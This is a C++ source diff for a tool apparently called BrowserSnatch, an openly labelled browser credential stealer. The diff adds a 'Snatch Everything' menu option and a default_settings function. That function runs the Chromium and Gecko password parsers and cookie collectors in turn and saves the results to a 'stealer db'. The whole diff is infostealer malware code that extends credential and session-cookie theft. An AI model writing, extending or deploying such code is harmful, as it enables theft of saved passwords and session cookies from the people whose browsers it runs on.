@@ -19,7 +19,7 @@ void Visualizer::visualization_main() {
     int choice;
     do {
         printMenu(); // Display the menu
-        std::cout << "\n\033[1;34mChoose an option to proceed (0-4): \033[0m";
+        std::cout << "\n\033[1;34mChoose an option to proceed (0-5): \033[0m";
         std::cin >> choice;
 
         handleUserChoice(choice); // Handle the user's choice
@@ -52,8 +52,32 @@ void Visualizer::printMenu() {
     std::cout << " \033[1;36m[2]\033[0m Snatch Gecko Based Browser Passwords" << std::endl;
     std::cout << " \033[1;36m[3]\033[0m Snatch Chromium Based Browser Cookies" << std::endl;
     std::cout << " \033[1;36m[4]\033[0m Snatch Gecko Based Browser Cookies" << std::endl;
+    std::cout << " \033[1;36m[5]\033[0m Snatch Everything {default settings}" << std::endl;
     std::cout << " \033[1;31m[0]\033[0m Exit" << std::endl;
     printDivider('=', 60);
+}
+
+BOOL Visualizer::default_settings(std::string converted_username, std::string stealer_db)
+{
+    if (!chromium_parser(converted_username, stealer_db))
+        std::cout << "Chromium Browsers dump failed!" << std::endl;
+
+    if (!gecko_parser(converted_username, stealer_db))
+        std::cout << "Gecko Browsers dump failed!" << std::endl;
+
+    if (!gecko_cookie_collector(converted_username, stealer_db))
+        std::cout << "Gecko Cookie Collector failed!" << std::endl;
+
+    if (!chromium_cookie_collector(converted_username, stealer_db))
+        std::cout << "Chromium Cookie Collector failed!" << std::endl;
+
+    if (std::filesystem::exists(stealer_db)) {
+        std::cout << "Stealer db saved: " << stealer_db << std::endl;
+        return true;
+    }
+    else {
+        return false;
+    }
 }
 
 // Function to handle the user's choice
@@ -86,6 +110,11 @@ void Visualizer::handleUserChoice(int choice) {
             std::cerr << "Gecko Cookie Snatch Failed" << std::endl;
         else
             std::cout << "Stealer db path: " << stealer_db << std::endl;
+        break;
+    case 5:
+        std::cout << "\n\033[1;33m>> Snatching Everything {default settings}...\033[0m" << std::endl;
+        if (!default_settings(converted_username, stealer_db))
+            std::cerr << "BrowserSnatch executed with {default settings}" << std::endl;
         break;
     case 0:
         std::cout << "\n\033[1;31mExiting BrowserSnatch. Goodbye!\033[0m" << std::endl;
